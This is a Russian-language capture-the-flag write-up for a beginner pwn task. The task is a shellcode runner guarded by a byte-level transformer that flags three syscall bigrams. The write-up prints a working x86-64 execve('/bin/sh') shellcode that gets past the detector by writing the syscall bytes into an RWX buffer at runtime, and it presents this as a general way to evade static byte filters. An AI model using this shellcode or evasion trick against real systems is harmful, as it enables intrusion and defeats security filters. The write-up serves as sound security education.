# filter — платформа 2026, pwn beginner (решено 2026-10-31)

**Таск**: filter, 432 очка / 9 солверов, pwn beginner. «Optimus Prime reporting for duty.»

**Что дано**: `filter.tar.gz` (filter.c, model.h, gen_model.py, Makefile) + `nc instances.платформа.online 1337` (токен).

**Суть**: shellcode-runner, защищённый «нейросетью» — кастомным байт-уровневым трансформером (score = max_i logit[i], malicious если score > 0). Веса в model.h аналитические (gen_model.py): детектор ровно ТРЁХ запрещённых биграмм:
- `0f 05` (syscall)
- `cd 80` (int 0x80)
- `0f 34` (sysenter)

Всё остальное считается benign. Окно внимания W=4, relbias даёт приоритет offset 1 (предыдущий байт). Это ровно детектор биграмм — не больше.

**Решение**: написать shellcode без запрещённых биграмм, а syscall (0f 05) ПИСАТЬ на лету в mmap-буфере (RWX):
```
lea rdi,[rip+str]     ; "/bin/sh"
xor esi,esi
xor edx,edx
push 59 ; pop rax      ; execve
lea rbx,[rip+sc]       ; буфер для syscall
mov byte [rbx],0x0f
mov byte [rbx+1],0x05
jmp rbx                ; выполняем сгенерированный syscall
sc: nop;nop
str: "/bin/sh",0
```
40 байт. Проверка: без запрещённых пар; эмуляция guard_score (gen_model.forward) = −10.0 ≤ 0 → пройдёт.

**Флаг**: `[FLAG]` (значение конкретной задачи; НЕ ответ для других задач).

**Мораль**:
1. Исходник + генератор модели = полная прозрачность: «нейросеть» свелась к детектору 3 биграмм. Сначала прочитать gen_model.py, потом страдать.
2. Обход детектора биграмм — самоперезапись кода в RWX-буфере (mov byte [rbx],0x0f; jmp) — паттерн, работающий против любых статических байт-фильтров.
3. Сервис при входе просил токен (в условии был) — читать баннер до отправки payload.
4. PowerShell + многострочный `bash -c '...'` ломается на переводах строк → скрипт файлом, запуск `wsl -d kali-linux -- bash /path/script.sh`.

**Солверы**: [archive]/filter/make_payload.py, payload_full.bin, exploit_remote.sh, filter_local.
